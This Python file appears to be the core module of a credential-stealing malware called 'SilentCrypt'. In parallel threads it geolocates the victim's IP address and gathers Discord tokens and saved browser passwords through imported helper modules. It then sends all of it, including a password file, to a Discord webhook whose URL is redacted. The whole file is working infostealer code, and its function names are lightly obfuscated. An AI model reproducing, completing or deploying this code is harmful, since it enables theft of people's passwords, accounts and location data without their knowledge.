import threading
import json
import requests, os

from urllib.request import Request, urlopen
from modules.discord_token import DiscordToken
from modules.password_browser import Browser

class Core:
    def __init__(self):
        self.Threadlist = []
        self.infoDevice = []
        self.wh00k = 'REDACTED_DISCORD_WEBHOOK'
        self.main()
    
    def main(self):
        t1 = threading.Thread(target=self.getInfoDevice)
        t2 = threading.Thread(target=self.run_browser)
        t3 = threading.Thread(target=self.run_discord_token)

        t1.start()
        t2.start()
        t3.start()

        self.Threadlist.append(t1)
        self.Threadlist.append(t2)
        self.Threadlist.append(t3)

        self.Threadlist.extend([t1, t2, t3])

        for t in self.Threadlist:
            t.join()
            
    def getInfoDevice(self):
        try:
            ip = urlopen(Request('https://api.ipify.org')).read().decode().strip()
            
            if ip:
                response = urlopen(Request(f'http://ip-api.com/json/{ip}')).read().decode()
               
                data = json.loads(response)
                
                infoDevice = {
                    'IP': data.get('query') or ip, 
                    'Country': data.get('country'),
                    'Region': data.get('region'),
                    'RegionName': data.get('regionName'),
                    'City': data.get('city'),
                    'ISP': data.get('isp'),
                    'Latitude': data.get('lat'),
                    'Longitude': data.get('lon')
                }
                
                description = "\n".join([f"**{k}**: {v}" for k, v in infoDevice.items()])
                
                self.d1sp4tchWb00k(self.wh00k, description, 'Device Info')
        except:
            return
    
    def run_discord_token(self):
        dtn = DiscordToken()
        dt = dtn.main()
        
        description = "\n".join([f"**{k}**: {v}" for k, v in dt.items()])

        self.d1sp4tchWb00k(self.wh00k, description, 'Discord Token')

    def run_browser(self):
        brp = Browser()
        br = brp.main()
        print(br.get('path'))
        self.d1sp4tchWb00k(self.wh00k, br.get('path'), 'Browser Passwords', True, br.get('path'))

    def d1sp4tchWb00k(self, wbh00k, payload, name = 'New infected device', file = False, path = None):
        if not file:
            p4yl04d = {
                "username": "SilentCrypt Webhook",
                "content": f"**{name}**",
                "embeds": [
                    {
                        "title": "Information received",
                        "description": payload,
                        "color": 0x3498db
                    }
                ]
            }
            
            try:
                requests.post(wbh00k, json=p4yl04d)
                return True
            except Exception as e:
                return False
        else:
            try:
                with open(path, 'rb') as f:
                    fs = {'file': ('pswd.txt', f)}
                    
                    p4yl04d = {
                        "username": "SilentCrypt Webhook",
                        "content": f"**{name}**"
                    }

                    requests.post(wbh00k, data=p4yl04d, files=fs)
                    return True
            except Exception as e:
                return False